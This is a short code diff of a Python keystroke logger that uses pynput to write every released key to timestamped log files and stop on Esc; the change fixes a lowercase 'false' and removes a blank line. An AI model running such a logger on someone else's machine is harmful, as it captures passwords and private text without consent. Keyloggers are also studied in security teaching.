@@ -1,7 +1,6 @@
 from pynput.keyboard import Listener, Key
 from datetime import datetime
 
-
 def generate_logs(text):
     logs = f'logs-{datetime.now().strftime("%d_%m_%Y_%I_%M_%S_%p")}.txt'
     with open(logs, "a") as log:
@@ -15,7 +14,7 @@ def vigilant(key):
     except AttributeError as identifier:
         generate_logs(f"< {str(key)} > ")
     if key == Key.esc:
-        return false
+        return False
 
 
 with Listener(on_release=vigilant) as listener:
